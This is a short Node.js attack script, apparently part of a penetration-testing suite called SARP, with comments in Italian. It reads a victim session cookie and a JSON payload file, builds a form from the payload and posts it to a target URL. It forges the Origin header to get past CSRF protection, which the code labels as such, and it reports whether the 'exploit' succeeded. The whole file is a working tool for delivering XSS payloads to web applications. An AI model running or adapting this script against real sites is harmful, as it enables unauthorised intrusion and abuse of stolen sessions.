import axios from 'axios';
import FormData from 'form-data';
import fs from 'fs';
import { exit } from 'process';
import ascii_text_generator from "ascii-text-generator";

console.log("\x1b[34m" , ascii_text_generator("SARP","2"));  // Banner
console.log("\nSARP Penetration Suite");

const args = process.argv.slice(2);
const url = args[0];
const cookie = args[1];
const payload_file = args[2];

if(url == null || cookie == null || payload_file == null){  // Controllo se esistano tutti i parametri
    console.error("\x1b[37m", "\nArgomenti mancanti.\n");
    console.log("USAGE: node xss.js URL COOKIE PAYLOAD_FILE");
    exit(255);
}

const payload_raw = fs.readFileSync(payload_file, 'utf-8'); // Leggo il payload
const payload = JSON.parse(payload_raw);     // Text to JSON

var data = new FormData();

Object.keys(payload).forEach(key => {
    data.append(key, payload[key]); // Riempio il form con tutti i campi del payload
})

const url_splitted = url.split("/");

var config = {
  method: 'post',
  url: url,
  headers: { 
    'Origin': url_splitted[0] + "//" + url_splitted[2],  // Bypass CSRF (SCHEME // HOST)
    'Cookie': 'session=' + cookie,  
    ...data.getHeaders()
  },
  data : data
};

try {
   const response = await axios(config);
   if(response.data.status == 204 || response.data.status == 200 || response.data.type == "success"){
        console.log("\x1b[32m", "Exploit riuscito");
   }else{
        console.log("\x1b[31m", "Exploit fallito, codice: ", response.data.status)
        exit(255);
   }
} catch (error) {
    console.log(error)
    console.log("\x1b[31m", "Exploit fallito. Codice errore", error.response.status);
}
